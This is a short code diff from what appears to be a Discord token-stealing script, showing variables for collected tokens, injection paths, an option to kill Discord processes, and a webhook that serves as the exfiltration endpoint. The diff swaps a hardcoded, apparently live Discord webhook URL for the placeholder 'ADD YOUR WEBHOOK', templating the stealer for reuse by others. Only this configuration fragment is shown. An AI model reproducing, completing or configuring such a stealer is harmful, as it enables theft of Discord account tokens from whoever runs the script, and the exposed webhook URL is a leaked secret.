@@ -11,7 +11,7 @@ let allTokens = [];
 let injectPaths = []; 
 
 const killDiscords = false; //(true) to restart all Discord processes, (false) for the opposite.
-const webhook = "https://discord.com/api/webhooks/1175475967544807434/qwT-uGc6lbkDYcNee0rbG_mImqsWIYicjbA7zbgrvu-WIYCCefjqQ-E2J2JA-S3Qfs7J";
+const webhook = "ADD YOUR WEBHOOK";
 
 switch (process.platform) {
   case "win32":
